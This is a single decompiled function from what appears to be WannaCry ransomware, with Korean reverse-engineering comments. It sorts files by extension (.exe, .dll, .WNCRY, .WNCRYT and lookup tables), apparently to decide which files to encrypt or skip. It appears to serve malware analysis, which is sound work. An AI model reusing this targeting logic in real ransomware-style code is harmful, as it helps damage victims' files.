// --- Metadata ---
// Function Name: GetFileExtensionType_10002D60
// Address: 0x10002D60
// Exported At: 20250522_175730
// Signature: unknown_signature
// ---------------
int __stdcall GetFileExtensionType_10002D60(wchar_t *filePath)
{
  int result; // eax
  const wchar_t *extStr; // edi
  wchar_t **v3; // esi
  wchar_t *v4; // eax
  wchar_t **v5; // esi
  wchar_t *v6; // eax
  int v7; // eax

  result = (int)wcsrchr(filePath, 0x2Eu);       // 파일 확장자를 검사하여 특정 확장자 유형을 분류 
  extStr = (const wchar_t *)result;             // exe, dll, WNCRY, WNCRYT, WNCYR  
  if ( result )
  {
    if ( wcsicmp((const wchar_t *)result, L".exe") && wcsicmp(extStr, L".dll") )
    {
      if ( wcsicmp(extStr, L".WNCRY") )
      {
        v3 = off_1000C098;
        if ( off_1000C098[0] )
        {
          while ( wcsicmp(*v3, extStr) )
          {
            v4 = v3[1];
            ++v3;
            if ( !v4 )
              goto LABEL_9;
          }
          result = 2;
        }
        else
        {
LABEL_9:
          v5 = off_1000C0FC;
          if ( off_1000C0FC[0] )
          {
            while ( wcsicmp(*v5, extStr) )
            {
              v6 = v5[1];
              ++v5;
              if ( !v6 )
                goto LABEL_15;
            }
            result = 3;
          }
          else
          {
LABEL_15:
            if ( wcsicmp(extStr, L".WNCRYT") )
            {
              v7 = -(wcsicmp(extStr, L".WNCYR") != 0);
              LOBYTE(v7) = v7 & 0xFB;
              result = v7 + 5;
            }
            else
            {
              result = 4;
            }
          }
        }
      }
      else
      {
        result = 6;
      }
    }
    else
    {
      result = 1;
    }
  }
  return result;
}
